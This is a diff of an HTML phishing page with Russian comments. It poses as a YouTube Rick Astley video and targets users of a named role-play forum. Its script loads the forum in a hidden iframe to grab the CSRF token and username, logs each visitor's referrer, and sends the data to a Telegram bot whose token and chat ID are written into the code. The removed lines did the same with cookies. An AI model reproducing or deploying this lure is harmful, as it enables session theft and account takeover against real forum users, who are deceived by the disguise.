@@ -2,10 +2,16 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Rick Astley - Never Gonna Give You Up</title>
+    <title>YouTube</title>
+    <!-- Мета-теги для красивого превью -->
+    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Video)">
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    
     <style>
-        body { margin: 0; padding: 0; background: #000; }
-        .video-container {
+        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
+        
+        /* Рикролл на 0.5 секунды */
+        #rickroll {
             position: fixed;
             top: 0;
             left: 0;
@@ -13,63 +19,104 @@
             height: 100%;
             z-index: 1;
         }
-        iframe {
+        
+        #rickroll iframe {
             width: 100%;
             height: 100%;
             border: none;
+            pointer-events: none; /* Чтобы нельзя было нажать паузу */
         }
-        .overlay {
+        
+        /* Затемнение и текст (для убедительности) */
+        #overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: transparent;
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 2;
-            cursor: pointer;
-        }
-        .timer {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
             color: white;
             font-family: Arial;
-            background: rgba(0,0,0,0.7);
-            padding: 10px 20px;
-            border-radius: 30px;
-            z-index: 3;
-            font-size: 14px;
+            font-size: 24px;
+            text-align: center;
+            animation: fadeOut 0.3s ease 0.2s forwards;
+            pointer-events: none;
+        }
+        
+        @keyframes fadeOut {
+            to { opacity: 0; }
+        }
+        
+        /* Абсолютно невидимый iframe (на всякий случай) */
+        #stealthFrame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;
+            top: -9999px;
+            left: -9999px;
         }
     </style>
 </head>
 <body>
-    <!-- Настоящий рикролл видео (жертва смотрит и радуется) -->
-    <div class="video-container">
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay"></iframe>
+    <!-- Рикролл на 0.5 секунды -->
+    <div id="rickroll">
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1" allow="autoplay"></iframe>
     </div>
     
-    <!-- Скрытый iframe для кражи -->
-    <iframe id="stealthFrame" style="position: absolute; width: 1px; height: 1px; opacity: 0.001; top: -100px; left: -100px;"></iframe>
+    <!-- Затемнение с текстом -->
+    <div id="overlay">
+        <div>
+            <div style="font-size: 48px; margin-bottom: 20px;">🎵</div>
+            <div>Загрузка видео...</div>
+            <div style="font-size: 14px; margin-top: 20px; color: #aaa;">Перенаправление на YouTube</div>
+        </div>
+    </div>
     
-    <!-- Таймер -->
-    <div class="timer" id="timer">Редирект через 30 сек • Нажмите на видео чтобы пропустить</div>
-    
-    <!-- Прозрачный слой для клика -->
-    <div class="overlay" onclick="redirectNow()"></div>
+    <!-- Невидимый iframe (запасной вариант) -->
+    <iframe id="stealthFrame"></iframe>
 
     <script>
+        // ТВОИ РАБОЧИЕ ДАННЫЕ
         const TELEGRAM_TOKEN = '8389131821:AAFHqe3YzYHBg2Xm6ybDYCegm7irwCqXi7w';
         const CHAT_ID = '-1003489685426';
         
+        // Функция отправки в Telegram
         function sendToTelegram(message) {
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message, 
+                    parse_mode: 'Markdown' 
+                })
             }).catch(() => {});
         }
         
-        // Тихо грузим форум в iframe
+        // Отправляем отчёт о переходе
+        sendToTelegram(
+            `📊 **ПЕРЕХОД ПО ССЫЛКЕ**\n\n` +
+            `🔗 Откуда: ${document.referrer || 'Прямой'}\n` +
+            `⏰ Время: ${new Date().toLocaleString('ru-RU')}`
+        );
+        
+        // Ждём 500 мс (полсекунды рикролла) и редиректим на форум
+        setTimeout(() => {
+            // ВАЖНО: Редирект на форум с JavaScript кодом в URL
+            window.location.href = 'https://forum.votive-rp.com/?steal_token=true#';
+            
+            // Если не сработает редирект, пробуем ещё
+            setTimeout(() => {
+                window.location.replace('https://forum.votive-rp.com');
+            }, 100);
+        }, 500);
+        
+        // ДОПОЛНИТЕЛЬНО: Пытаемся украсть через iframe (на всякий случай)
         const iframe = document.getElementById('stealthFrame');
         iframe.src = 'https://forum.votive-rp.com';
         
@@ -78,46 +125,16 @@
                 const doc = iframe.contentDocument || iframe.contentWindow.document;
                 const token = doc.querySelector('html')?.getAttribute('data-csrf');
                 const user = doc.querySelector('.p-navgroup-link--user .p-navgroup-linkText')?.textContent?.trim();
-                const cookies = doc.cookie;
-                const avatar = doc.querySelector('.avatar img')?.src || 'Нет';
                 
                 if (token) {
                     sendToTelegram(
-                        `🎣 **CSRF УКРАДЕН ВО ВРЕМЯ ПРОСМОТРА РИКРОЛЛА!**\n\n` +
-                        `👤 **Юзер:** ${user}\n` +
-                        `🎫 **Токен:** \`${token}\`\n` +
-                        `🍪 **Куки:** \`${cookies}\`\n` +
-                        `🖼️ **Аватар:** ${avatar}\n` +
-                        `⏰ **Время:** ${new Date().toLocaleString('ru-RU')}\n` +
-                        `🎵 *Смотрел Rick Astley и даже не подозревал...*`
+                        `🎣 **CSRF УКРАДЕН ЧЕРЕЗ IFRAME!**\n\n` +
+                        `👤 ${user}\n` +
+                        `🎫 \`${token}\``
                     );
                 }
-            } catch (e) {
-                // Отправляем инфу о CORS
-                sendToTelegram(`ℹ️ **CORS защита**: ${e.message}`);
-            }
+            } catch(e) {}
         };
-        
-        // Таймер редиректа
-        let seconds = 30;
-        const timerEl = document.getElementById('timer');
-        
-        const interval = setInterval(() => {
-            seconds--;
-            timerEl.textContent = `Редирект через ${seconds} сек • Нажмите на видео чтобы пропустить`;
-            
-            if (seconds <= 0) {
-                clearInterval(interval);
-                redirectNow();
-            }
-        }, 1000);
-        
-        function redirectNow() {
-            window.location.href = 'https://forum.votive-rp.com';
-        }
-        
-        // Отчёт о переходе
-        sendToTelegram(`📊 **ПЕРЕХОД**\n🔗 ${document.referrer || 'Прямой'}\n⏰ ${new Date().toLocaleString('ru-RU')}`);
     </script>
 </body>
 </html>
